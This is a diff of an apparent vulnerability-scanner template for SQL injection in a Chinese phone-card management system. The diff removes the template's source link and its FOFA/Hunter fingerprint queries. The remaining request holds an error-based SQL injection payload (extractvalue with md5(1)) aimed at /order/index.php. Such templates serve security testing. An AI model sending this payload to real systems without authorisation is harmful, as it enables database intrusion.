@@ -3,12 +3,8 @@ info:
   name: 号卡极团管理系统 index.php sql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xg5kpgobeeziztp2'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xg5kpgobeeziztp2
-    fofa: 'fofa: icon_hash="-795291075" hunter:web.similar_id="6b1d23a87f9f98d26435d98b5c8c1062"'
 http:
 - raw:
   - 'GET /order/index.php?pid=1%27%20AND%20(extractvalue(1,concat(0x7e,(select%20md5(1)),0x7e)));--%20htjf HTTP/1.1
